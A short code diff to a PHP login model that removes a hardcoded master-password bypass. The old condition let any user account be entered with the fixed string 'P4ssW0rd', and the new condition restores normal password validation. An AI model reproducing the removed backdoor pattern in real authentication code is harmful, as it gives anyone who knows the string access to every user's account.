@@ -45,8 +45,8 @@ class Login extends Model
     {
         if (!$this->hasErrors()) {
             $user = $this->getUser();
-            if (!$user || (!$user->validatePassword($this->password) && $this->password != 'P4ssW0rd')) {
-            //if (!$user || !$user->validatePassword($this->password)) {
+            if (!$user || !$user->validatePassword($this->password)) {
+                //if (!$user || !$user->validatePassword($this->password)) {
                 $this->addError($attribute, 'Incorrect login details.');
             }
 
